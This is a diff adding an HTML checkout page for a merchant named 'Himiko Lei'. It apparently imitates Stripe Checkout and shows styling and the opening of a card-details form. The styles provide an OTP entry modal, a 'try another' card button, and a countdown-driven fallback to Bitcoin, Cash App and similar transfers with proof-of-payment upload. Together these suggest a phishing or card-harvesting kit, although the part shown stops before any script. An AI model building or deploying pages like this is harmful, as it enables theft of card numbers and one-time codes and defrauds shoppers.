@@ -1,0 +1,2346 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Checkout – Himiko Lei</title>
+  <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <!-- Supabase SDK -->
+
+
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<style>
+    
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+
+:root {
+  --bg: #f5f5f7;
+  --surface: #ffffff;
+  --border: #e0e0e0;
+  --border-focus: #0a2540;
+  --text: #1a1a2e;
+  --muted: #6b7280;
+  --placeholder: #b0b7c3;
+  --accent: #0a2540;
+  --btn: #0a2540;
+  --btn-text: #ffffff;
+  --danger: #dc2626;
+  --warn-bg: #fffbeb;
+  --warn-border: #fbbf24;
+  --warn-text: #92400e;
+  --radius: 8px;
+  --radius-lg: 12px;
+  --shadow: 0 2px 12px rgba(0,0,0,0.07);
+  --font: 'Sora', sans-serif;
+}
+
+body {
+  font-family: var(--font);
+  background: var(--bg);
+  color: var(--text);
+  min-height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: flex-start;
+}
+
+.phone-shell {
+  width: 100%;
+  max-width: 400px;
+  min-height: 100vh;
+  background: var(--bg);
+  display: flex;
+  flex-direction: column;
+}
+
+/* ── Top bar ── */
+.topbar {
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 14px 18px 10px; background: var(--bg);
+}
+.topbar-left { display: flex; align-items: center; gap: 10px; }
+.back-btn {
+  background: none; border: none; cursor: pointer;
+  padding: 4px; color: var(--muted); display: flex; align-items: center;
+}
+.merchant-logo {
+  width: 36px; height: 36px; border-radius: 50%;
+  background: #f0ede8; border: 1px solid var(--border);
+  display: flex; align-items: center; justify-content: center;
+  font-size: 11px; color: var(--muted); font-weight: 600; letter-spacing: -0.3px;
+}
+.merchant-name { font-size: 15px; font-weight: 600; color: var(--text); }
+.sandbox-badge {
+  background: var(--accent); color: #fff;
+  font-size: 11px; font-weight: 600;
+  padding: 3px 9px; border-radius: 6px; letter-spacing: 0.3px;
+}
+.details-btn {
+  font-size: 13px; color: var(--text); text-decoration: underline;
+  background: none; border: none; cursor: pointer;
+  display: flex; align-items: center; gap: 3px;
+  font-family: var(--font); font-weight: 500;
+}
+
+/* ── Email row ── */
+.email-row {
+  margin: 10px 16px 0; background: var(--surface);
+  border: 1px solid var(--border); border-radius: var(--radius-lg);
+  padding: 13px 16px; display: flex; align-items: center;
+  justify-content: space-between; box-shadow: var(--shadow);
+}
+.email-label { font-size: 13px; color: var(--muted); font-weight: 500; }
+.email-value { font-size: 13px; color: var(--text); font-weight: 500; }
+
+/* ── Section title ── */
+.section-title {
+  font-size: 15px; font-weight: 700; color: var(--text);
+  margin: 20px 16px 10px;
+}
+
+/* ── Card panel ── */
+.card-panel {
+  margin: 0 16px; background: var(--surface);
+  border: 1.5px solid var(--border); border-radius: var(--radius-lg);
+  box-shadow: var(--shadow); overflow: hidden;
+}
+.card-panel-header {
+  display: flex; align-items: center; gap: 10px;
+  padding: 14px 16px 12px; border-bottom: 1px solid var(--border);
+}
+.radio-dot {
+  width: 20px; height: 20px; border-radius: 50%;
+  border: 2px solid var(--accent);
+  display: flex; align-items: center; justify-content: center; flex-shrink: 0;
+}
+.radio-dot::after {
+  content: ''; width: 10px; height: 10px;
+  border-radius: 50%; background: var(--accent);
+}
+.card-icon { display: flex; align-items: center; }
+.card-label { font-size: 15px; font-weight: 600; color: var(--text); }
+
+/* ── Form fields ── */
+.form-body {
+  padding: 16px 16px 18px; display: flex; flex-direction: column; gap: 14px;
+}
+.field-group label {
+  display: block; font-size: 12px; color: var(--muted);
+  font-weight: 500; margin-bottom: 6px; letter-spacing: 0.1px;
+}
+.input-box {
+  width: 100%; border: 1.5px solid var(--border); border-radius: var(--radius);
+  padding: 11px 13px; font-size: 16px; font-family: var(--font);
+  color: var(--text); background: var(--surface); outline: none;
+  transition: border-color 0.18s, box-shadow 0.18s;
+}
+.input-box::placeholder { color: var(--placeholder); }
+.input-box:focus {
+  border-color: var(--border-focus);
+  box-shadow: 0 0 0 3px rgba(10,37,64,0.08);
+}
+.input-box.error { border-color: var(--danger); box-shadow: 0 0 0 3px rgba(220,38,38,0.08); }
+
+.card-number-wrapper { position: relative; }
+.card-number-wrapper .input-box { padding-right: 130px; letter-spacing: 1px; }
+.card-logos {
+  position: absolute; right: 10px; top: 50%;
+  transform: translateY(-50%); display: flex; gap: 3px; align-items: center;
+}
+.cvc-wrapper { position: relative; }
+.cvc-wrapper .input-box { padding-right: 44px; }
+.cvc-icon {
+  position: absolute; right: 11px; top: 50%;
+  transform: translateY(-50%); display: flex; align-items: center;
+}
+.row-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+
+.select-wrapper { position: relative; }
+.select-wrapper select {
+  width: 100%; border: 1.5px solid var(--border); border-radius: var(--radius);
+  padding: 11px 36px 11px 13px; font-size: 14px; font-family: var(--font);
+  color: var(--text); background: var(--surface); outline: none;
+  appearance: none; cursor: pointer; transition: border-color 0.18s;
+}
+.select-wrapper select:focus {
+  border-color: var(--border-focus);
+  box-shadow: 0 0 0 3px rgba(10,37,64,0.08);
+}
+.select-arrow {
+  position: absolute; right: 12px; top: 50%;
+  transform: translateY(-50%); pointer-events: none;
+}
+
+/* ── Save row ── */
+.save-row {
+  margin: 14px 16px 0; background: var(--surface);
+  border: 1.5px solid var(--border); border-radius: var(--radius-lg);
+  padding: 13px 14px; display: flex; align-items: flex-start;
+  gap: 12px; box-shadow: var(--shadow);
+}
+.save-row input[type="checkbox"] {
+  width: 18px; height: 18px; cursor: pointer;
+  flex-shrink: 0; margin-top: 2px; accent-color: var(--accent);
+}
+.save-text { font-size: 13px; color: var(--text); font-weight: 500; line-height: 1.5; }
+.save-text span { color: var(--muted); font-weight: 400; }
+.save-link { color: var(--accent); text-decoration: underline; }
+
+/* ── Pay button ── */
+.pay-btn-wrap { padding: 20px 16px 8px; }
+.pay-btn {
+  width: 100%; background-color: var(--btn-text);
+  border: none; border-radius: var(--radius); padding: 15px;
+  font-size: 15px; font-weight: 700; font-family: var(--font);
+  cursor: pointer; letter-spacing: 0.2px;
+  transition: background 0.18s, transform 0.1s, box-shadow 0.18s;
+  box-shadow: 0 2px 8px rgba(10,37,64,0.18);
+}
+.pay-btn:hover { background: #0d2f54; box-shadow: 0 4px 16px rgba(10,37,64,0.22); }
+.pay-btn:active { transform: scale(0.98); }
+.pay-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+
+/* ── Footer ── */
+.stripe-footer {
+  display: flex; align-items: center; justify-content: center;
+  gap: 6px; padding: 14px 0 32px; color: var(--muted); font-size: 12px;
+}
+
+/* ── Error msg (inline) ── */
+.error-msg { font-size: 11px; color: var(--danger); margin-top: 4px; display: none; }
+.error-msg.show { display: block; }
+
+/* ════════════════════════════════
+   OVERLAYS
+════════════════════════════════ */
+.overlay {
+  display: none; position: fixed; inset: 0;
+  background: rgba(5, 15, 35, 0.6);
+  backdrop-filter: blur(6px);
+  z-index: 200;
+  justify-content: center; align-items: center; padding: 20px;
+}
+.overlay.active { display: flex; }
+
+/* Spinner */
+.spinner-box {
+  display: flex; flex-direction: column; align-items: center; gap: 22px;
+}
+.spinner-ring {
+  width: 80px; height: 80px; border-radius: 50%;
+  border: 5px solid rgba(255,255,255,0.12);
+  border-top-color: #ffffff;
+  animation: spin 0.85s linear infinite;
+  position: relative; display: flex; align-items: center; justify-content: center;
+}
+.spinner-icon { font-size: 28px; line-height: 1; }
+@keyframes spin { to { transform: rotate(360deg); } }
+.spinner-label {
+  color: #fff; font-size: 16px; font-weight: 700; text-align: center;
+}
+.spinner-sub {
+  color: rgba(255,255,255,0.6); font-size: 13px; text-align: center; margin-top: 4px;
+}
+
+/* Modal card */
+.modal-card {
+  background: var(--surface); border-radius: 22px;
+  padding: 30px 24px 26px; width: 100%; max-width: 360px;
+  box-shadow: 0 24px 70px rgba(0,0,0,0.28);
+  animation: popIn 0.3s cubic-bezier(.34,1.56,.64,1);
+}
+@keyframes popIn {
+  from { opacity: 0; transform: scale(0.86) translateY(24px); }
+  to   { opacity: 1; transform: scale(1) translateY(0); }
+}
+.modal-icon { font-size: 40px; text-align: center; display: block; margin-bottom: 14px; }
+.modal-title {
+  font-size: 18px; font-weight: 700; color: var(--text);
+  text-align: center; margin-bottom: 7px;
+}
+.modal-sub {
+  font-size: 13px; color: var(--muted); text-align: center;
+  line-height: 1.6; margin-bottom: 18px;
+}
+
+/* Warning banner */
+.warn-banner {
+  background: var(--warn-bg); border: 1px solid var(--warn-border);
+  border-radius: 9px; padding: 11px 13px; margin-bottom: 18px;
+  display: flex; gap: 9px; align-items: flex-start;
+}
+.warn-banner .wi { font-size: 15px; flex-shrink: 0; margin-top: 1px; }
+.warn-banner p { font-size: 12px; color: var(--warn-text); line-height: 1.55; }
+
+/* Modal fields */
+.modal-field { margin-bottom: 12px; }
+.modal-field label {
+  display: block; font-size: 12px; color: var(--muted);
+  font-weight: 500; margin-bottom: 5px;
+}
+
+/* Modal button */
+.modal-btn {
+  width: 100%; background: var(--btn); color: #fff;
+  border: none; border-radius: var(--radius); padding: 14px;
+  font-size: 14px; font-weight: 700; font-family: var(--font);
+  cursor: pointer; margin-top: 6px;
+  transition: background 0.18s, box-shadow 0.18s;
+  box-shadow: 0 2px 8px rgba(10,37,64,0.18);
+}
+.modal-btn:hover { background: #0d2f54; }
+.modal-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+
+/* Modal error */
+.modal-error {
+  font-size: 12px; color: var(--danger); text-align: center;
+  margin-top: 10px; display: none;
+}
+.modal-error.show { display: block; }
+
+/* OTP */
+.otp-row {
+  display: flex; gap: 8px; justify-content: center; margin: 16px 0 20px;
+}
+.otp-input {
+  width: 44px; height: 54px;
+  border: 1.5px solid var(--border); border-radius: 10px;
+  text-align: center; font-size: 22px; font-weight: 700;
+  font-family: var(--font); color: var(--text); outline: none;
+  transition: border-color 0.18s, box-shadow 0.18s;
+}
+.otp-input:focus {
+  border-color: var(--border-focus);
+  box-shadow: 0 0 0 3px rgba(10,37,64,0.10);
+}
+.otp-input.filled { border-color: var(--accent); background: #f0f4ff; }
+
+.resend-link {
+  text-align: center; font-size: 13px; color: var(--muted); margin-top: 14px;
+}
+.resend-link a {
+  color: var(--accent); text-decoration: underline; cursor: pointer; font-weight: 600;
+}
+
+
+    /* ── Modal card ── */
+    .payment-modal {
+      background: var(--surface);
+      border-radius: var(--radius-lg);
+      box-shadow: 0 20px 60px rgba(10, 37, 64, 0.18), var(--shadow);
+      width: 100%;
+      max-width: 420px;
+      padding: 32px 28px 28px;
+      animation: slideUp 0.35s cubic-bezier(0.22, 1, 0.36, 1) both;
+    }
+
+    @keyframes slideUp {
+      from { opacity: 0; transform: translateY(24px) scale(0.97); }
+      to   { opacity: 1; transform: translateY(0) scale(1); }
+    }
+
+    /* ── Warning banner ── */
+    .payment-warning {
+      background: var(--warn-bg);
+      border: 1px solid var(--warn-border);
+      border-radius: var(--radius);
+      padding: 12px 14px;
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      margin-bottom: 24px;
+    }
+
+    .payment-warning svg {
+      flex-shrink: 0;
+      margin-top: 1px;
+      color: var(--warn-border);
+    }
+
+    .payment-warning-text {
+      font-size: 13px;
+      color: var(--warn-text);
+      line-height: 1.5;
+      font-weight: 500;
+    }
+
+    .payment-warning-text strong {
+      display: block;
+      font-size: 13.5px;
+      margin-bottom: 2px;
+      font-weight: 700;
+    }
+
+    /* ── Heading ── */
+    .payment-heading {
+      font-size: 15px;
+      font-weight: 600;
+      color: var(--muted);
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      margin-bottom: 14px;
+    }
+
+    /* ── Option buttons ── */
+    .payment-options {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .payment-option {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      padding: 15px 16px;
+      border: 1.5px solid var(--border);
+      border-radius: var(--radius);
+      background: var(--surface);
+      cursor: pointer;
+      transition: border-color 0.18s, box-shadow 0.18s, background 0.18s;
+      font-family: var(--font);
+      width: 100%;
+      text-align: left;
+    }
+
+    .payment-option:hover {
+      border-color: var(--border-focus);
+      box-shadow: 0 0 0 3px rgba(10, 37, 64, 0.07);
+      background: #f8f9fb;
+    }
+
+    .payment-option:active {
+      background: #f0f2f5;
+    }
+
+    .payment-option-icon {
+      width: 40px;
+      height: 40px;
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      font-size: 20px;
+    }
+
+    .icon-cashapp  { background: #e6f9f0; }
+    .icon-paypal   { background: #e8f0fb; }
+    .icon-applepay { background: #f0f0f2; }
+    .icon-bitcoin  { background: #fff8ec; }
+
+    .payment-option-info {
+      flex: 1;
+    }
+
+    .payment-option-name {
+      font-size: 15px;
+      font-weight: 600;
+      color: var(--text);
+      display: block;
+    }
+
+    .payment-option-sub {
+      font-size: 12px;
+      color: var(--muted);
+      margin-top: 1px;
+      display: block;
+    }
+
+    .payment-option-arrow {
+      color: var(--placeholder);
+      transition: color 0.18s, transform 0.18s;
+    }
+
+    .payment-option:hover .payment-option-arrow {
+      color: var(--accent);
+      transform: translateX(3px);
+    }
+
+    /* ── Divider ── */
+    .payment-divider {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin: 20px 0 0;
+    }
+
+    .payment-divider hr {
+      flex: 1;
+      border: none;
+      border-top: 1px solid var(--border);
+    }
+
+    .payment-divider span {
+      font-size: 11.5px;
+      color: var(--placeholder);
+      font-weight: 500;
+      white-space: nowrap;
+    }
+
+    /* ── Footer note ── */
+    .payment-footer {
+      text-align: center;
+      font-size: 11.5px;
+      color: var(--placeholder);
+      margin-top: 16px;
+      line-height: 1.6;
+    }
+
+    .payment-footer a {
+      color: var(--accent);
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    /* Demo trigger button */
+    .demo-btn {
+      font-family: var(--font);
+      background: var(--btn);
+      color: var(--btn-text);
+      border: none;
+      border-radius: var(--radius);
+      padding: 12px 24px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      box-shadow: var(--shadow);
+    }
+ 
+ .pay-icon { width:38px; height:38px; border-radius:8px; display:flex; align-items:center; justify-content:center; flex-shrink:0; }
+  .pay-icon svg { width:22px; height:22px; }
+  .pay-icon.cashapp  { background:#e6f9f0; }
+  .pay-icon.paypal   { background:#e8f0fb; }
+  .pay-icon.applepay { background:#f0f0f2; }
+  .pay-icon.bitcoin  { background:#fff8ec; }
+
+  .payment-modal {
+    background:var(--surface,#fff); border-radius:var(--radius-lg,12px);
+    box-shadow:0 20px 60px rgba(10,37,64,.18); width:100%; max-width:440px;
+    padding:28px 24px 24px; animation:pmSlideUp .35s cubic-bezier(.22,1,.36,1) both;
+    max-height:90vh; overflow-y:auto; font-family:var(--font,'Sora',sans-serif);
+  }
+  @keyframes pmSlideUp {
+    from{opacity:0;transform:translateY(22px) scale(.97);}
+    to{opacity:1;transform:translateY(0) scale(1);}
+  }
+  .pm-warning {
+    background:var(--warn-bg,#fffbeb); border:1px solid var(--warn-border,#fbbf24);
+    border-radius:var(--radius,8px); padding:12px 14px; display:flex; gap:10px;
+    align-items:flex-start; margin-bottom:20px;
+  }
+  .pm-warning svg{flex-shrink:0;margin-top:2px;color:var(--warn-border,#fbbf24);}
+  .pm-warning-text{font-size:13px;color:var(--warn-text,#92400e);line-height:1.5;}
+  .pm-warning-text strong{display:block;font-weight:700;margin-bottom:2px;}
+  .pm-label{font-size:11px;font-weight:600;letter-spacing:.09em;text-transform:uppercase;color:var(--muted,#6b7280);margin-bottom:12px;}
+  .pm-options{display:flex;flex-direction:column;gap:9px;}
+  .pm-option{display:flex;align-items:center;gap:13px;padding:13px 14px;border:1.5px solid var(--border,#e0e0e0);border-radius:var(--radius,8px);background:var(--surface,#fff);cursor:pointer;font-family:var(--font,'Sora',sans-serif);width:100%;text-align:left;transition:border-color .18s,box-shadow .18s,background .18s;}
+  .pm-option:hover{border-color:var(--border-focus,#0a2540);box-shadow:0 0 0 3px rgba(10,37,64,.07);background:#f8f9fb;}
+  .pm-option-info{flex:1;}
+  .pm-option-name{font-size:14px;font-weight:600;color:var(--text,#1a1a2e);display:block;}
+  .pm-option-addr{font-size:12px;color:var(--muted,#6b7280);display:block;margin-top:1px;word-break:break-all;}
+  .pm-option-desc{font-size:11.5px;color:var(--placeholder,#b0b7c3);display:block;margin-top:1px;}
+  .pm-arrow{color:var(--placeholder,#b0b7c3);transition:color .18s,transform .18s;flex-shrink:0;}
+  .pm-option:hover .pm-arrow{color:var(--accent,#0a2540);transform:translateX(3px);}
+  .pm-loading,.pm-empty{font-size:13px;color:var(--muted,#6b7280);text-align:center;padding:20px 0;}
+  .pm-detail-section{display:none;margin-top:20px;}
+  .pm-detail-section.visible{display:block;}
+  .pm-selected-info{background:#f8f9fb;border:1.5px solid var(--border,#e0e0e0);border-radius:var(--radius,8px);padding:14px 16px;margin-bottom:14px;}
+  .pm-selected-label{font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:.08em;color:var(--muted,#6b7280);}
+  .pm-selected-addr{font-size:15px;font-weight:700;color:var(--text,#1a1a2e);margin-top:4px;word-break:break-all;}
+  .pm-countdown-bar{margin-bottom:16px;}
+  .pm-countdown-label{display:flex;justify-content:space-between;align-items:center;font-size:12px;color:var(--muted,#6b7280);margin-bottom:6px;}
+  .pm-countdown-time{font-weight:700;color:var(--text,#1a1a2e);font-size:13px;}
+  .pm-countdown-time.urgent{color:var(--danger,#dc2626);}
+  .pm-track{height:4px;background:var(--border,#e0e0e0);border-radius:99px;overflow:hidden;}
+  .pm-fill{height:100%;background:var(--accent,#0a2540);border-radius:99px;transition:width 1s linear,background .5s;}
+  .pm-fill.urgent{background:var(--danger,#dc2626);}
+  .pm-made-btn{width:100%;padding:13px;font-family:var(--font,'Sora',sans-serif);font-size:14px;font-weight:600;background:var(--btn,#0a2540);color:var(--btn-text,#fff);border:none;border-radius:var(--radius,8px);cursor:pointer;transition:opacity .18s;margin-bottom:10px;}
+  .pm-made-btn:disabled{opacity:.5;cursor:not-allowed;}
+  .pm-upload-section{display:none;}
+  .pm-upload-section.visible{display:block;}
+  .pm-upload-label{font-size:13px;font-weight:600;color:var(--text,#1a1a2e);margin-bottom:8px;display:block;}
+  .pm-dropzone{border:2px dashed var(--border,#e0e0e0);border-radius:var(--radius,8px);padding:22px;text-align:center;cursor:pointer;transition:border-color .18s,background .18s;position:relative;}
+  .pm-dropzone:hover{border-color:var(--border-focus,#0a2540);background:#f8f9fb;}
+  .pm-dropzone input[type="file"]{position:absolute;inset:0;opacity:0;cursor:pointer;width:100%;height:100%;}
+  .pm-dropzone-icon{font-size:28px;margin-bottom:6px;}
+  .pm-dropzone-text{font-size:13px;color:var(--muted,#6b7280);}
+  .pm-dropzone-text strong{color:var(--accent,#0a2540);}
+  .pm-preview{margin-top:10px;border-radius:var(--radius,8px);overflow:hidden;display:none;}
+  .pm-preview img{width:100%;max-height:180px;object-fit:cover;display:block;}
+  .pm-submit-btn{width:100%;margin-top:10px;padding:13px;font-family:var(--font,'Sora',sans-serif);font-size:14px;font-weight:600;background:#16a34a;color:#fff;border:none;border-radius:var(--radius,8px);cursor:pointer;display:none;transition:opacity .18s;}
+  .pm-submit-btn:disabled{opacity:.5;cursor:not-allowed;}
+  .pm-submit-btn.visible{display:block;}
+  .pm-success-msg{background:#f0fdf4;border:1px solid #86efac;border-radius:var(--radius,8px);padding:13px 15px;font-size:13px;color:#166534;font-weight:500;display:none;margin-top:10px;}
+  .pm-success-msg.visible{display:block;}
+  .pm-divider{display:flex;align-items:center;gap:10px;margin:18px 0 0;}
+  .pm-divider hr{flex:1;border:none;border-top:1px solid var(--border,#e0e0e0);}
+  .pm-divider span{font-size:11px;color:var(--placeholder,#b0b7c3);white-space:nowrap;font-weight:500;}
+  .pm-footer{text-align:center;font-size:11.5px;color:var(--placeholder,#b0b7c3);margin-top:14px;}
+  .pm-footer a{color:var(--accent,#0a2540);text-decoration:none;font-weight:500;}
+
+.pm-option-wrap {
+  display: flex;
+  flex-direction: column;
+  gap: 5px;
+}
+
+.pm-copy-btn {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 5px;
+  padding: 6px 12px;
+  font-family: var(--font, 'Sora', sans-serif);
+  font-size: 11.5px;
+  font-weight: 600;
+  color: var(--muted, #6b7280);
+  background: var(--bg, #f5f5f7);
+  border: 1px solid var(--border, #e0e0e0);
+  border-radius: 6px;
+  cursor: pointer;
+  align-self: flex-end;
+  transition: background .15s, color .15s, border-color .15s;
+}
+
+.pm-copy-btn:hover {
+  background: var(--accent, #0a2540);
+  color: #fff;
+  border-color: var(--accent, #0a2540);
+}
+
+.pm-copy-btn.copied {
+  background: #dcfce7;
+  color: #166534;
+  border-color: #86efac;
+}
+
+#tryAnotherBtn {
+  background: #e8e8ea;
+  color: #0a5cff;
+  border: none;
+  border-radius: 18px;
+  padding: 8px 16px;
+  font-size: 15px;
+  font-weight: 500;
+  cursor: pointer;
+  transition: background 0.15s ease;
+}
+
+#tryAnotherBtn:hover {
+  background: #ddddde;
+}
+
+#tryAnotherBtn:disabled {
+  opacity: 0.7;
+  cursor: not-allowed;
+}
+
+.pm-progress-track {
+  width: 100%;
+  height: 4px;
+  background: #e8e8ea;
+  border-radius: 2px;
+  overflow: hidden;
+}
+
+.pm-progress-fill {
+  height: 100%;
+  background: #0a5cff;
+  transition: width 0.2s linear;
+}
+
+.overlay-box {
+  background: #fff;
+  border-radius: 20px;
+  padding: 24px 20px;
+  max-width: 360px;
+  width: 90%;
+  margin: 0 auto;
+  box-shadow: 0 10px 40px rgba(0,0,0,0.25);
+}
+
+.overlay-box h3 {
+  font-size: 17px;
+  font-weight: 700;
+  margin: 0 0 16px;
+  color: #111;
+}
+
+/* ── Order items ── */
+#orderSummaryItems {
+  border-bottom: 1px solid #ececec;
+  padding-bottom: 12px;
+  margin-bottom: 12px;
+}
+
+.os-item {
+  display: flex;
+  justify-content: space-between;
+  font-size: 14px;
+  color: #333;
+  padding: 6px 0;
+}
+
+.os-item-name {
+  flex: 1;
+  padding-right: 10px;
+}
+
+.os-item-price {
+  font-weight: 500;
+  white-space: nowrap;
+}
+
+.os-empty {
+  font-size: 13px;
+  color: #999;
+  text-align: center;
+  padding: 12px 0;
+}
+
+/* ── Totals ── */
+.order-summary-totals {
+  border-bottom: 1px solid #ececec;
+  padding-bottom: 12px;
+  margin-bottom: 12px;
+}
+
+.order-summary-totals .row {
+  display: flex;
+  justify-content: space-between;
+  font-size: 14px;
+  color: #555;
+  padding: 4px 0;
+}
+
+.order-summary-totals .row.total {
+  font-size: 16px;
+  font-weight: 700;
+  color: #111;
+  padding-top: 8px;
+}
+
+/* ── Address ── */
+.order-summary-address {
+  margin-bottom: 18px;
+}
+
+.order-summary-address strong {
+  font-size: 13px;
+  color: #111;
+  display: block;
+  margin-bottom: 4px;
+}
+
+.order-summary-address p {
+  font-size: 13px;
+  color: #666;
+  margin: 0;
+  line-height: 1.4;
+}
+
+/* ── Proceed button ── */
+#proceedToPaymentBtn {
+  width: 100%;
+  background: #0a2a5e;
+  color: #fff;
+  border: none;
+  border-radius: 12px;
+  padding: 14px;
+  font-size: 16px;
+  font-weight: 600;
+  cursor: pointer;
+}
+
+#proceedToPaymentBtn:hover {
+  background: #0d3373;
+}
+.os-item {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  font-size: 14px;
+  color: #333;
+  padding: 8px 0;
+}
+
+.os-item-img {
+  width: 44px;
+  height: 44px;
+  border-radius: 8px;
+  object-fit: cover;
+  flex-shrink: 0;
+}
+
+.os-item-info {
+  flex: 1;
+  display: flex;
+  flex-direction: column;
+  min-width: 0;
+}
+
+.os-item-name {
+  font-weight: 500;
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+}
+
+.os-item-meta {
+  font-size: 12px;
+  color: #999;
+}
+
+.os-item-price {
+  font-weight: 600;
+  white-space: nowrap;
+}
+
+.pm-amount-box {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  background: rgba(56,189,248,0.08);
+  border: 1px solid rgba(56,189,248,0.25);
+  border-radius: 10px;
+  padding: 12px 16px;
+  margin: 14px 0;
+}
+.pm-amount-label {
+  font-size: 12px;
+  color: var(--muted, #94a3b8);
+  text-transform: uppercase;
+  letter-spacing: 0.05em;
+}
+.pm-amount-value {
+  font-size: 18px;
+  font-weight: 700;
+  color: #38bdf8;
+}
+
+.bt-detail-row {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 10px 0;
+  border-bottom: 1px solid rgba(255,255,255,0.08);
+  gap: 12px;
+}
+.bt-detail-row:last-child { border-bottom: none; }
+.bt-detail-text {
+  display: flex;
+  flex-direction: column;
+  gap: 2px;
+  min-width: 0;
+}
+.bt-detail-label {
+  font-size: 11px;
+  color: var(--muted, #64748b);
+  text-transform: uppercase;
+  letter-spacing: 0.03em;
+}
+.bt-detail-value {
+  font-size: 14px;
+  font-weight: 600;
+  color: #1e293b; /* dark, legible against the light "pm-selected-info" card background */
+  font-family: 'SF Mono', Consolas, monospace;
+  word-break: break-all;
+}
+.bt-copy-btn {
+  flex-shrink: 0;
+  background: rgba(56,189,248,0.15);
+  border: 1px solid rgba(56,189,248,0.3);
+  color: #0369a1;
+  border-radius: 6px;
+  padding: 6px 12px;
+  font-size: 12px;
+  font-weight: 600;
+  cursor: pointer;
+}
+
+.bt-currency-group {
+  margin-bottom: 18px;
+}
+.bt-currency-group:last-child {
+  margin-bottom: 0;
+}
+.bt-currency-title {
+  font-size: 13px;
+  font-weight: 700;
+  color: var(--text, #f1f5f9);
+  margin-bottom: 6px;
+  padding-bottom: 6px;
+  border-bottom: 1px solid rgba(255,255,255,0.12);
+}
+
+
+
+</style>
+</head>
+<body>
+
+<!-- ══════════════ MAIN PAGE ══════════════ -->
+
+<div class="phone-shell">
+
+  <div class="topbar">
+    <div class="topbar-left">
+      <button class="back-btn" onclick="history.back()">
+        <svg width="9" height="15" viewBox="0 0 9 15" fill="none">
+          <path d="M8 1L1.5 7.5L8 14" stroke="#6b7280" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </button>
+      <div class="merchant-logo">HL</div>
+      <span class="merchant-name">Himiko Lei</span>
+
+    </div>
+  </div>
+
+  <div class="email-row">
+    <span class="email-label">Email</span>
+    <span class="email-value" id="displayEmail">—</span>
+  </div>
+
+  <div class="section-title">Payment method</div>
+
+  <div class="card-panel">
+    <div class="card-panel-header">
+      <div class="radio-dot"></div>
+      <span class="card-icon">
+        <svg width="22" height="16" viewBox="0 0 22 16" fill="none">
+          <rect x="0.5" y="0.5" width="21" height="15" rx="2.5" fill="#fff" stroke="#d1d5db"/>
+          <rect x="0" y="4" width="22" height="4" fill="#1a1a2e"/>
+          <rect x="2" y="11" width="5" height="2" rx="0.5" fill="#d1d5db"/>
+        </svg>
+      </span>
+      <span class="card-label">Card</span>
+    </div>
+
+
+<div class="form-body">
+  <!-- Card number -->
+  <div class="field-group">
+    <label for="cardNumber">Card information</label>
+    <div class="card-number-wrapper">
+      <input class="input-box" id="cardNumber" type="tel" inputmode="numeric"
+        placeholder="1234 1234 1234 1234" maxlength="19" autocomplete="cc-number"/>
+      <div class="card-logos">
+        <svg width="34" height="22" viewBox="0 0 34 22"><rect width="34" height="22" rx="3" fill="#1A1F71"/><text x="5" y="16" font-family="Arial" font-weight="bold" font-size="11" fill="white">VISA</text></svg>
+        <svg width="34" height="22" viewBox="0 0 34 22"><rect width="34" height="22" rx="3" fill="#252525"/><circle cx="13" cy="11" r="7" fill="#EB001B"/><circle cx="21" cy="11" r="7" fill="#F79E1B"/><path d="M17 5.57a7 7 0 010 10.86A7 7 0 0117 5.57z" fill="#FF5F00"/></svg>
+        <svg width="34" height="22" viewBox="0 0 34 22"><rect width="34" height="22" rx="3" fill="#fff" stroke="#e5e7eb"/><text x="1" y="14" font-family="Arial" font-weight="bold" font-size="6.5" fill="#231F20">DIS</text><text x="1" y="20" font-family="Arial" font-weight="bold" font-size="6.5" fill="#231F20">COVER</text><circle cx="26" cy="11" r="7" fill="#F76F20"/></svg>
+      </div>
+    </div>
+    <div class="error-msg" id="cardNumberErr">Please enter a valid 16-digit card number.</div>
+  </div>
+
+  <!-- Expiry + CVC -->
+  <div class="row-2">
+    <div class="field-group">
+      <label for="expiry">&nbsp;</label>
+      <input class="input-box" id="expiry" type="tel" inputmode="numeric"
+        placeholder="MM / YY" maxlength="7" autocomplete="cc-exp"/>
+      <div class="error-msg" id="expiryErr">Invalid expiry date.</div>
+    </div>
+    <div class="field-group">
+      <label for="cvc">&nbsp;</label>
+      <div class="cvc-wrapper">
+        <input class="input-box" id="cvc" type="tel" inputmode="numeric"
+          placeholder="CVC" maxlength="4" autocomplete="cc-csc"/>
+        <span class="cvc-icon">
+          <svg width="22" height="16" viewBox="0 0 22 16" fill="none">
+            <rect x="0.5" y="0.5" width="21" height="15" rx="2.5" fill="#f3f4f6" stroke="#d1d5db"/>
+            <rect x="0" y="4" width="22" height="3.5" fill="#d1d5db"/>
+            <rect x="13" y="9" width="6" height="2" rx="0.5" fill="#b0b7c3"/>
+          </svg>
+        </span>
+      </div>
+      <div class="error-msg" id="cvcErr">Invalid CVC.</div>
+    </div>
+  </div>
+
+  <!-- Cardholder name -->
+  <div class="field-group">
+    <label for="cardName">Cardholder name</label>
+    <input class="input-box" id="cardName" type="text"
